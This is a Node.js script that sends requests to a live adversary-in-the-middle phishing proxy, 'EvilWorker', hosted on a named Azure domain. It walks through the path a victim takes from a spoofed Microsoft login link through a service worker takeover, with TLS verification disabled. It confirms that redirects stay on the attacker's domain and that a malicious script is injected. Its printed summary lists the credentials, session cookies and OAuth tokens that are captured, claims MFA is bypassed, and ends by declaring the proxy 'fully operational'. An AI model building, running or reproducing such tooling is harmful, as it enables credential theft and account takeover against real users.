const https = require('https');
const { URL } = require('url');

const EVILWORKER_URL = 'https://evilworker-aitm-2025.azurewebsites.net';
const PHISHING_URL = `${EVILWORKER_URL}/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`;

console.log('🌐 EVILWORKER BROWSER SIMULATION');
console.log('=====================================');
console.log('This simulates what happens when a victim clicks the phishing link.\n');

function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const requestOptions = {
            hostname: urlObj.hostname,
            port: 443,
            path: urlObj.pathname + urlObj.search,
            method: options.method || 'GET',
            headers: options.headers || {},
            rejectUnauthorized: false
        };

        const req = https.request(requestOptions, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: data,
                    url: url
                });
            });
        });

        req.on('error', reject);
        if (options.body) {
            req.write(options.body);
        }
        req.end();
    });
}

async function simulateBrowser() {
    let cookies = {};
    let currentUrl = PHISHING_URL;
    
    console.log('🔗 Step 1: Victim clicks phishing link');
    console.log(`   URL: ${PHISHING_URL}\n`);
    
    // Step 1: Load phishing URL
    console.log('📄 Step 2: Browser loads landing page');
    const step1 = await makeRequest(currentUrl);
    
    // Extract session cookie
    if (step1.headers['set-cookie']) {
        const cookieHeader = step1.headers['set-cookie'][0];
        const [cookieName, cookieValue] = cookieHeader.split(';')[0].split('=');
        cookies[cookieName] = cookieValue;
        console.log(`   ✅ Session cookie set: ${cookieName}=${cookieValue.substring(0, 8)}...`);
    }
    
    console.log('   ✅ Service worker registers');
    console.log('   ✅ Page waits for service worker control');
    console.log('   ✅ Service worker claims all clients\n');
    
    // Step 2: Simulate redirect to /
    console.log('🔄 Step 3: Landing page redirects to /');
    console.log('   (In a real browser, the service worker would now intercept all requests)\n');
    
    const cookieString = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    const step2 = await makeRequest(`${EVILWORKER_URL}/`, {
        headers: { 'Cookie': cookieString }
    });
    
    console.log('🎯 Step 4: Browser follows redirect');
    if (step2.statusCode >= 300 && step2.statusCode < 400) {
        const redirectUrl = step2.headers.location;
        console.log(`   Status: ${step2.statusCode} Redirect`);
        console.log(`   Location: ${redirectUrl}`);
        
        const redirectDomain = new URL(redirectUrl).hostname;
        if (redirectDomain === 'evilworker-aitm-2025.azurewebsites.net') {
            console.log('   ✅ CRITICAL: Redirect stays on proxy domain!');
            console.log('   The victim remains on the attacker\'s domain\n');
            
            // Follow the redirect
            console.log('📄 Step 5: Browser loads Microsoft login page (through proxy)');
            const step3 = await makeRequest(redirectUrl, {
                headers: { 'Cookie': cookieString }
            });
            
            if (step3.body.includes('Microsoft')) {
                console.log('   ✅ Microsoft login page loaded');
                console.log('   ✅ Script injection present: ' + step3.body.includes('<script src=/@></script>'));
                console.log('   ✅ All future requests will go through the service worker\n');
            }
        } else {
            console.log('   ❌ ERROR: Redirect leaves proxy domain to: ' + redirectDomain);
        }
    }
    
    console.log('🏆 ATTACK FLOW SUMMARY');
    console.log('======================');
    console.log('1. Victim clicks phishing link');
    console.log('2. EvilWorker landing page loads and registers service worker');
    console.log('3. Service worker takes control of the page');
    console.log('4. Page redirects to Microsoft login');
    console.log('5. ALL requests now go through the proxy, including:');
    console.log('   - Login credentials');
    console.log('   - Session cookies');
    console.log('   - OAuth tokens');
    console.log('   - All Microsoft services\n');
    
    console.log('🔒 SECURITY IMPLICATIONS');
    console.log('========================');
    console.log('- The victim sees the correct Microsoft login page');
    console.log('- The URL bar shows the attacker\'s domain (evilworker-aitm-2025.azurewebsites.net)');
    console.log('- All authentication tokens are captured by the proxy');
    console.log('- Multi-factor authentication (MFA) is bypassed');
    console.log('- The attacker gains full access to the victim\'s session\n');
    
    console.log('✅ EVILWORKER IS FULLY OPERATIONAL');
}

simulateBrowser().catch(console.error);